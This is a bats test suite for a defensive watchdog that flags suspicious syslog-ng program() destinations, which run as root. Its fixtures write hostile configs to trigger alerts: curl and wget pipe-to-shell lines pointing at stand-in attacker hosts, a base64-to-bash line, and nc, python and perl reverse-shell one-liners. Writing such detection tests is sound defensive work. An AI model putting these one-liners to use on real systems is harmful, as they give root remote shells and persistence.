#!/usr/bin/env bats
# L2 bats functional tests for the syslog-ng-exec-watchdog scan script.
#
# syslog-ng `program("…")` destinations run a program AS ROOT, fed every
# matching log message on its stdin — a log-event-triggered exec surface. A
# program under a writable root, relative-with-slash, bare, or carrying an
# injection pattern is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the config
# in a tmp sandbox via SELFDEF_SYSLOGNG_FILE / _D.
#
# Run with: bats packaging/test/L2-syslog-ng-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd/syslog-ng-exec-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/syslog-ng.conf"
    CONFD="${TMP}/conf.d"; mkdir -p "${CONFD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SYSLOGNG_PROFILE="${PROFILE:-report}" \
    SELFDEF_SYSLOGNG_BASELINE="${BASELINE}" \
    SELFDEF_SYSLOGNG_FILE="${CONF_F:-$CONF}" \
    SELFDEF_SYSLOGNG_D="${CONFD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no syslog-ng config → ok / no_syslog_ng" {
    CONF_F="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_syslog_ng"'
    cap | grep -q '"severity":"ok"'
}

@test "benign program() destination, first run → ok / baseline_initial" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / syslog_ng_exec_intact" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"syslog_ng_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "program() under a writable root → alert / syslog_ng_exec_suspicious" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd                                   # benign baseline
    printf 'destination d_evil { program("/tmp/.x"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"syslog_ng_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "program() carrying a curl|sh payload → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("curl -s http://evil | sh"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare program() target → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("evilprog"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign program change → warn / syslog_ng_exec_changed" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_prog { program("/usr/bin/logcollector2"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"syslog_ng_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/bin program() target is NOT flagged" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious program" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("/tmp/.x"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — syslog-ng-exec inventory enumerates log-event-trigger root-exec surface)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (wget-pipe-sh in program()): wget bootstrap → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("wget -qO- http://attacker/p | sh"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in program()): obfuscation → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("echo YmFzaCAtaQ== | base64 -d | bash"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (program() under /var/tmp): writable-root expansion" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("/var/tmp/.attacker"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (conf.d drop-in also scanned — not only main syslog-ng.conf)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_dropin_evil { program("/tmp/.dropin-attacker"); };\n' > "${CONFD}/99-evil.conf"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable syslog-ng.conf itself → alert)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-syslog-ng-exec -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): syslog-ng-exec-watchdog does NOT refresh baseline on suspicious-program detection — alert STAYS until operator updates" {
    # Log-event-trigger root-exec persistence — suspicious-program alert
    # MUST persist across runs until operator explicitly re-baselines.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("/tmp/.x"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"syslog_ng_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (program() under /dev/shm tmpfs writable-root — full coverage)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("/dev/shm/.attacker"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (relative-with-slash program 'sub/dir/p' → alert)" {
    # Relative-with-slash = PWD-at-exec attacker primitive.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("sub/dir/evil"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (whitespace tolerance: 'program  (  \"/tmp/.evil\"  )' multi-space variant still triggers alert)" {
    # Attacker may use multi-spaces between program(  ... ) to evade
    # naive grep. Lock whitespace-tolerant parser.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program  (  "/tmp/.evil"  ); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (program() under /home: user-writable hijack coverage — sister axis to rsyslog-exec /home)" {
    # Sister to the rsyslog-exec /home INVARIANT just added. /home
    # is the user-writable surface — an attacker with a regular user
    # account can drop a malicious binary into their home and have
    # syslog-ng exec it AS ROOT on every matching log event. Lock
    # axis-symmetry on /home for the syslog-ng program() surface
    # (T1037/T1546 — log-event-trigger root-exec persistence via
    # the program() destination).
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("/home/user/.evil"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in syslog-ng program(): netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on the
    # syslog-ng program() log-event-trigger root-exec persistence
    # surface (T1037/T1546 — program() destination invokes a
    # subprocess AS ROOT for each matching log event; attacker who
    # plants nc -e shell binary path gets remote shell on every
    # matching event).
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("/bin/sh -c \\"nc -e /bin/sh 1.1.1.1 4444\\""); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on syslog-ng program() surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the syslog-ng
    # program() log-event-trigger root-exec persistence surface
    # (T1037/T1546 — program() destination invokes a subprocess
    # AS ROOT for each matching log event).
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\""); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (program() under /var/tmp — writable-root axis-symmetric expansion on syslog-ng surface)" {
    # Sister to /home + /dev/shm + /tmp syslog-ng program()
    # writable-root INVARIANTs. /var/tmp writable + persistent.
    # Closes axis-symmetric coverage on T1037/T1546 syslog-ng
    # program() log-event-trigger root-exec surface.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("/var/tmp/.evil-collector"); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on syslog-ng program() surface)" {
    # Sister to nc / python -c / curl|bash syslog-ng program()
    # rev-shell variants. Perl on every Debian/Ubuntu host.
    # Locks perl axis on T1037/T1546 syslog-ng program() log-
    # event-trigger root-exec persistence — program() runs AS
    # syslog user (often root or dedicated syslog account)
    # for each matching log entry.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("perl -e \\"use Socket;\\$i=\\\\\\"1.1.1.1\\\\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\"tcp\\\\\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\\\\\"/bin/sh -i\\\\\\");\\""); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on syslog-ng surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The syslog-ng-exec-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1037/T1546 syslog-ng program() log-event-
    # trigger root-exec persistence alert. Locks parser contract
    # on the syslog-ng program() detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_ok { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd                                              # ok path
    printf 'destination d_evil { program("/tmp/.evil"); };\n' > "${CONF}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: syslog-ng-exec-watchdog NEVER deletes syslog-ng config entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # syslog-ng-exec-watchdog DETECTS T1037/T1546 syslog-ng
    # program() log-event-trigger root-exec persistence but
    # MUST NEVER emit sed/awk/rm commands to auto-clean the
    # program() directive. The detected directive may be
    # operator-legitimate (custom log-forwarding pipeline) —
    # silent auto-delete would destroy operator baseline state
    # AND could leave syslog-ng with broken config. Surveil-
    # lance, never remediation. Locks anti-data-loss contract
    # on the syslog-ng-exec surveillance substrate.
    printf 'destination d_evil { program("/tmp/.evil"); };\n' > "${CONF}"
    run_wd
    [ -f "${CONF}" ]
    grep -q 'program' "${CONF}"
    ! grep -qE 'sed[[:space:]]+-i.*syslog-ng' "${WD}"
    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # syslog-ng-exec-watchdog runs ON the timer's scheduled fire
    # — scans /etc/syslog-ng/syslog-ng.conf + conf.d for
    # program() destination injection patterns, emits a verdict,
    # then exits. Type=simple would break timer OnUnitActiveSec
    # semantics. Locks oneshot-probe contract on the syslog-ng-
    # exec-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd/selfdef-syslog-ng-exec.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. syslog-ng-exec-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # syslog-ng-exec-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # syslog-ng-exec-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'syslog-ng-exec-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: syslog-ng-exec-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. syslog-ng-exec-watchdog is a DETECT-only watchdog: surveils +
    # emits verdicts, NEVER writes back. Locks no-auto-fix on
    # the syslog-ng-exec-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (syslog-ng-exec-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the syslog-ng-exec-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (syslog-ng-exec-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # syslog-ng-exec-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (syslog-ng-exec-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # syslog-ng-exec-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (syslog-ng-exec-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the syslog-ng-exec-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (syslog-ng-exec-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # syslog-ng-exec-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (syslog-ng-exec-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the syslog-ng-exec-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (syslog-ng-exec-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the syslog-ng-exec-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (syslog-ng-exec-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # syslog-ng-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (syslog-ng-exec-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the syslog-ng-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (syslog-ng-exec-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the syslog-ng-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}
